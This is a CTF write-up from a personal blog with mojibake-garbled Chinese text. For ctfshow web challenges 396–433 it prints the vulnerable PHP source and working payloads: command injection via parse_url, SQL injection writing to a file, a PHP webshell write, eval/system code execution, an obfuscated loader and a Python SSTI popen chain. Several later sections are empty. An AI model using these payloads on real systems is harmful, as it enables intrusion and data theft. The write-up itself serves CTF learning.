<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>[ctfshow]å…¶ä»– | fallingskies</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">


  
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
  

  


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="web396
æºç 
&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    shell_exec('ech..." />
    <meta name="keywords" content="" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://fallingskies22.github.io">
        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
        <h1 class="site-title">fallingskies</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
        
          <a href="/post/friends" class="site-nav">
            å‹é“¾
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      <h3>æƒ³è¦å»æœˆçƒ<h3>
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">[ctfshow]å…¶ä»–</h2>
            <div class="post-date">2024-07-02</div>
            
              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowqi-ta.jpg')">
              </div>
            
            <div class="post-content" v-pre>
              <h2 id="web396">web396</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    shell_exec('echo '.$url['host'].'&gt; '.$url['path']);

}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>åˆ©ç”¨å‘½ä»¤æ³¨å…¥</p>
<pre><code>?url=http://www.baidu.com/var/www/html/2;ls&gt;a
?url=http://www.baidu.com/var/www/html/2;cat%20fl0g.php&gt;a
</code></pre>
<h2 id="web397">web397</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);

}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>å‘½ä»¤æ³¨å…¥ï¼Œå’Œä¸Šé¢˜ç›¸åŒ</p>
<pre><code>?url=http://www.baidu.com/2;cat%20fl0g.php&gt;a
</code></pre>
<h2 id="web398">web398</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!preg_match('/;/', $url['host'])){
        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>è¿‡æ»¤æ‰äº†åˆ†å·ï¼Œä½¿ç”¨&amp;&amp;è¿›è¡Œç»•è¿‡</p>
<pre><code>/?url=http://www.baidu.com/2%26%26cat%20fl0g.php%3Ea
</code></pre>
<h2 id="web399">web399</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!preg_match('/;|&gt;/', $url['host'])){
        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>è¿‡æ»¤äº†å¤§äºå·ï¼Œä½¿ç”¨å°äºå·ç»§ç»­ç»•è¿‡</p>
<pre><code>/?url=http://www.baidu.com/2%26%26touch%20a&lt;cat%20fl0g.php
</code></pre>
<h2 id="web400">web400</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!preg_match('/;|&gt;|http|https/i', $url['host'])){
        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>æ‰å‘ç°åªå¯¹hoståšäº†è¿‡æ»¤ï¼Œpathæ²¡æœ‰è¿‡æ»¤ğŸ¤£</p>
<pre><code>/?url=http://www.baidu.com/2;cat%20fl0g.php&gt;a 
</code></pre>
<h2 id="web401">web401</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

#error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    var_dump($url);
    if(!preg_match('/;|&gt;|http|https|\|/i', $url['host'])){
        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
</code></pre>
<pre><code>/?url=http://www.baidu.com/2;cat%20fl0g.php&gt;a 
</code></pre>
<h2 id="web402">web402</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

#error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    var_dump($url);
    if(preg_match('/http|https/i', $url['scheme'])){
        die('error');
    }
    if(!preg_match('/;|&gt;|\||base/i', $url['host'])){
        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>è¿‡æ»¤äº†httpå’Œhttpsåè®®ï¼Œä½¿ç”¨ftpåè®®ã€‚</p>
<pre><code>/?url=ftp://www.baidu.com/2;cat%20fl0g.php&gt;a 
</code></pre>
<h2 id="web403">web403</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(preg_match('/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)$/', $url['host'])){
        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>é™åˆ¶hostå¿…é¡»ä¸ºipåœ°å€</p>
<pre><code>/?url=http://1.1.1.1/2;cat%20fl0g.php&gt;a
</code></pre>
<h2 id="web404">web404</h2>
<p>è¿™é‡Œæœ‰ä¸ªå½©è›‹ï¼Œéœ€è¦è®¿é—®<code>404.php</code></p>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){
        if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){
            shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
        }
    }

}else{
    highlight_file(__FILE__);
}
</code></pre>
<p>pathè¢«é™åˆ¶äº†ï¼Œä½¿ç”¨hostè¿›è¡Œæ³¨å…¥ã€‚</p>
<pre><code>/404.php?url=http://1.1.1.1;cat%20fl0g.php%3Ea;/1
</code></pre>
<h2 id="web405">web405</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){
        if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){
            if(preg_match('/\~|\.|php/', $url['scheme'])){
                shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
            }
            
        }
    }

}else{
    highlight_file(__FILE__);
    echo 'parse_url å¥½å¼ºå¤§';
}
</code></pre>
<pre><code>/?url=php://1.1.1.1;cat%20fl0g.php&gt;a;/1
</code></pre>
<h2 id="web406">web406</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

require 'config.php';
//flag in db
highlight_file(__FILE__);
$url=$_GET['url'];
if(filter_var ($url,FILTER_VALIDATE_URL)){
    $sql = &quot;select * from links where url ='{$url}'&quot;;
    $result = $conn-&gt;query($sql);
}else{
    echo 'ä¸é€šè¿‡';
}
</code></pre>
<p>è¿™é¢˜æ˜¯sqlæ³¨å…¥</p>
<pre><code>?url=http://127.0.0.1/1%27union/**/select/**/1,flag/**/from/**/flag/**/into/**/outfile/**/%27/var/www/html/3.txt
</code></pre>
<h2 id="web407">web407</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
$ip=$_GET['ip'];

if(filter_var ($ip,FILTER_VALIDATE_IP)){
    call_user_func($ip);
}

class cafe{
    public static function add(){
        echo file_get_contents('flag.php');
    }
}

</code></pre>
<p>è¿™é‡Œå¯¹ipåœ°å€æ ¡éªŒï¼Œåˆšå¥½call_user_funcè°ƒç”¨ç±»å‡½æ•°çš„æ–¹å¼ç¬¦åˆipv6åœ°å€å½¢å¼ã€‚</p>
<pre><code>/?ip=cafe::add
</code></pre>
<h2 id="web408">web408</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
$email=$_GET['email'];

if(filter_var ($email,FILTER_VALIDATE_EMAIL)){
    file_put_contents(explode('@', $email)[1], explode('@', $email)[0]);
}

</code></pre>
<p>åˆ©ç”¨file_put_contentså†™å…¥shell</p>
<pre><code>/?email=&quot;&lt;?=eval($_POST[1])?&gt;&quot;@shell.php
</code></pre>
<h2 id="web409">web409</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
$email=$_GET['email'];
if(filter_var ($email,FILTER_VALIDATE_EMAIL)){
    $email=preg_replace('/.flag/', '', $email);
    eval($email);
}

</code></pre>
<p>æ·»åŠ flagï¼Œå½“é€šè¿‡æ­£åˆ™æ—¶ï¼Œåˆšå¥½èƒ½å»é™¤å‰é¢çš„åŒå¼•å·ã€‚</p>
<pre><code>?email=&quot;flagsystem($_GET[1]);?&gt;&quot;@a.com&amp;1=cat%20/flag
</code></pre>
<h2 id="web410">web410</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
include('flag.php');
$b=$_GET['b'];
if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){
    if($b=='true' || intval($b)&gt;0){
        die('FLAG NOT HERE');
    }else{
        echo $flag;
    }
}
</code></pre>
<p>è€ƒå¯ŸFILTER_VALIDATE_BOOLEAN</p>
<p>å¦‚æœæ˜¯ &quot;1&quot;ã€&quot;true&quot;ã€&quot;on&quot; å’Œ &quot;yes&quot;ï¼Œåˆ™è¿”å› TRUEã€‚<br>
å¦‚æœæ˜¯ &quot;0&quot;ã€&quot;false&quot;ã€&quot;off&quot; å’Œ &quot;no&quot;ï¼Œåˆ™è¿”å› FALSEã€‚<br>
å¦åˆ™è¿”å› NULLã€‚</p>
<pre><code>?b=yes
</code></pre>
<h2 id="web411">web411</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
include('flag.php');
$b=$_GET['b'];
if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){
    if($b=='true' || intval($b)&gt;0 ||$b=='on' || $b=='ON'){
        die('FLAG NOT HERE');
    }else{
        echo $flag;
    }
}
</code></pre>
<p>ä½¿ç”¨Onæˆ–è€…yeséƒ½è¡Œ</p>
<h2 id="web412">web412</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);

$ctfshow=$_POST['ctfshow'];

if(isset($ctfshow)){
    file_put_contents('flag.php', '//'.$ctfshow,FILE_APPEND);
    include('flag.php');
}

</code></pre>
<p>ä½¿ç”¨æ¢è¡Œç¬¦<code>%0a</code>ç»•è¿‡æ³¨é‡Šç¬¦<code>//</code></p>
<pre><code>ctfshow=%0asystem('cat flag.php');
</code></pre>
<h2 id="web413">web413</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);

$ctfshow=$_POST['ctfshow'];

if(isset($ctfshow)){
        file_put_contents('flag.php', '/*'.$ctfshow.'*/',FILE_APPEND);
    include('flag.php');
}
</code></pre>
<p>å¦ä¸€ç§æ³¨é‡Šæ–¹å¼ï¼Œä½¿ç”¨é—­åˆæ¥ç»•è¿‡ã€‚</p>
<pre><code>ctfshow=*/system('cat flag.php');/*
</code></pre>
<h2 id="web414">web414</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php


highlight_file(__FILE__);
include('flag.php');
$ctfshow=$_GET['ctfshow'];

if($ctfshow==true){
    if(sqrt($ctfshow)&gt;=sqrt(intval($flag))){
        echo 'FLAG_NOT_HERE';
    }else{
        echo $flag;
    }
}
</code></pre>
<p>sqrtå‡½æ•°å½“å‚æ•°ä¸ºè´Ÿæ•°æ—¶ï¼Œè¿”å›NaNã€‚</p>
<p>åœ¨ PHP ä¸­ï¼Œå½“ä½ å°è¯•æ¯”è¾ƒåŒ…å« NaN çš„æ•°å€¼æ—¶ï¼Œç»“æœæ€»æ˜¯ falseï¼Œå› ä¸º NaN ä»£è¡¨â€œä¸æ˜¯æ•°å­—â€(Not-a-Number)ã€‚ä»»ä½•æ¶‰åŠ NaN çš„æ“ä½œï¼ŒåŒ…æ‹¬æ¯”è¾ƒï¼Œéƒ½ä¼šè¿”å› false æˆ–è€…å½“ä½œ false æ¥å¤„ç†ã€‚</p>
<pre><code>/?ctfshow=-1
</code></pre>
<h2 id="web415">web415</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
highlight_file(__FILE__);

$k = $_GET[k];

function getflag(){
    echo file_get_contents('flag.php');
}

if($k=='getflag'){
    die('FLAG_NOT_HERE');
}else{
    call_user_func($k);
}
</code></pre>
<p>æ³•ä¸€ï¼šphpçš„å‡½æ•°åã€ç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œå¯é€šè¿‡å¤§å†™æ¥ç»•è¿‡ã€‚</p>
<p>æ³•äºŒï¼šåˆ©ç”¨å‘½åç©ºé—´</p>
<p>å¦‚æœæ²¡æœ‰å®šä¹‰ä»»ä½•å‘½åç©ºé—´ï¼Œæ‰€æœ‰çš„ç±»ä¸å‡½æ•°çš„å®šä¹‰éƒ½æ˜¯åœ¨å…¨å±€ç©ºé—´ï¼Œä¸ PHP å¼•å…¥å‘½åç©ºé—´æ¦‚å¿µå‰ä¸€æ ·ã€‚åœ¨åç§°å‰åŠ ä¸Šå‰ç¼€\è¡¨ç¤ºè¯¥åç§°æ˜¯å…¨å±€ç©ºé—´ä¸­çš„åç§°</p>
<pre><code>?k=GETFLAG
?k=\getflag
</code></pre>
<h2 id="web416">web416</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
highlight_file(__FILE__);

class ctf{
    public function getflag(){
        return 'fake flag';
    }
    final public function flag(){
        echo file_get_contents('flag.php');
    }
}

class show extends ctf{
    public function __construct($f){
        call_user_func($f);
    }
}

echo new show($_GET[f]);
</code></pre>
<p>è°ƒç”¨ç±»ä¸­å‡½æ•°ã€‚</p>
<pre><code>/?f=ctf::flag
</code></pre>
<h2 id="web417">web417</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php /*ctfshow*/define('aPeKTP0126',__FILE__);$cIYMfW=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$CBhSfw=$cIYMfW[3].$cIYMfW[6].$cIYMfW[33].$cIYMfW[30];$xWoIVy=$cIYMfW[33].$cIYMfW[10].$cIYMfW[24].$cIYMfW[10].$cIYMfW[24];$RkEEuV=$xWoIVy[0].$cIYMfW[18].$cIYMfW[3].$xWoIVy[0].$xWoIVy[1].$cIYMfW[24];$YFfKrW=$cIYMfW[7].$cIYMfW[13];$CBhSfw.=$cIYMfW[22].$cIYMfW[36].$cIYMfW[29].$cIYMfW[26].$cIYMfW[30].$cIYMfW[32].$cIYMfW[35].$cIYMfW[26].$cIYMfW[30];eval($CBhSfw(&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;));?&gt;
</code></pre>
<p>ä»£ç åšäº†æ··æ·†ï¼Œå°†evalæ”¹ä¸ºechoæ¥è§£æ··æ·†ã€‚<br>
è¿™é‡Œå¥—äº†4å±‚ï¼Œä¸»è¦æ˜¯ç”¨å­—ç¬¦ä¸²æˆªå–å’Œbase64æ¥æ··æ·†ã€‚</p>
<pre><code class="language-php">&lt;?php

error_reporting(0);
include('flag.php');
$c=$_GET['ctf'];
if($c=='show'){
	echo $flag;
}else{
	echo 'FLAG_NOT_HERE';
}
</code></pre>
<h2 id="web418">web418</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

$key= 0;
$clear='clear.php';
highlight_file(__FILE__);

//è·å–å‚æ•°
$ctfshow=$_GET['ctfshow'];
//åŒ…å«æ¸…ç†è„šæœ¬
include($clear);

extract($_POST);
if($key===0x36d){
    //å¸®é»‘é˜”å†™å¥½åé—¨
    eval('&lt;?php '.$ctfshow.'?&gt;');
}else{
    $die?die('FLAG_NOT_HERE'):clear($clear);
}

function clear($log){
    shell_exec('rm -rf '.$log);
}
</code></pre>
<p><code>extract</code>å‡½æ•°å¤„å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–ï¼Œä½†æ˜¯ä¸Šä¼ <code>key</code>å‚æ•°ç±»å‹å§‹ç»ˆä¸ºstringï¼Œæ— æ³•é€šè¿‡åˆ¤æ–­ã€‚<br>
åœ¨elseå¤„è¿›è¡Œå˜é‡è¦†ç›–+å‘½ä»¤æ³¨å…¥ã€‚</p>
<pre><code>die=0&amp;clear=;cat flag.php &gt; 1.txt;
</code></pre>
<h2 id="web419">web419</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);


$code = $_POST['code'];
if(strlen($code) &lt; 17){
    eval($code);
}
</code></pre>
<p>ä»£ç æ‰§è¡Œï¼Œä¸”é™åˆ¶é•¿åº¦ã€‚</p>
<pre><code>code=system('cat *');
</code></pre>
<h2 id="web420">web420</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);

$code = $_POST['code'];
if(strlen($code) &lt; 8){
    system($code);
}
</code></pre>
<p>å‘½ä»¤æ‰§è¡Œï¼Œä¸”é™åˆ¶é•¿åº¦ã€‚</p>
<pre><code>code=nl ../*
</code></pre>
<h2 id="web421">web421</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);

$code = $_POST['code'];
if(strlen($code) &lt; 6){
    system($code);
}
</code></pre>
<p>å‘½ä»¤æ‰§è¡Œï¼Œä¸”é™åˆ¶é•¿åº¦ã€‚</p>
<pre><code>code=cat *
</code></pre>
<h2 id="web422">web422</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);

$code = $_POST['code'];
if(strlen($code) &lt; 5){
    system($code);
}
</code></pre>
<p>å‘½ä»¤æ‰§è¡Œï¼Œä¸”é™åˆ¶é•¿åº¦ã€‚</p>
<pre><code>code=nl *
</code></pre>
<h2 id="web423">web423</h2>
<p>è¿™é¢˜æ˜¯SSTIï¼Œæ²¡æœ‰æç¤ºã€‚ã€‚ã€‚</p>
<pre><code>?code=&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[%27popen%27](&quot;env&quot;).read()
</code></pre>
<h2 id="web424">web424</h2>
<h2 id="web425">web425</h2>
<h2 id="web426">web426</h2>
<h2 id="web427">web427</h2>
<h2 id="web428">web428</h2>
<h2 id="web429">web429</h2>
<h2 id="web430">web430</h2>
<h2 id="web431">web431</h2>
<p>åŒä¸Šé¢˜</p>
<h2 id="web432">web432</h2>
<h2 id="web433">web433</h2>
<p>è¿‡æ»¤äº†openã€readå­—ç¬¦ã€‚<br>
ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡openï¼Œä½¿ç”¨å¸¦å¤–ç»•è¿‡readã€‚</p>
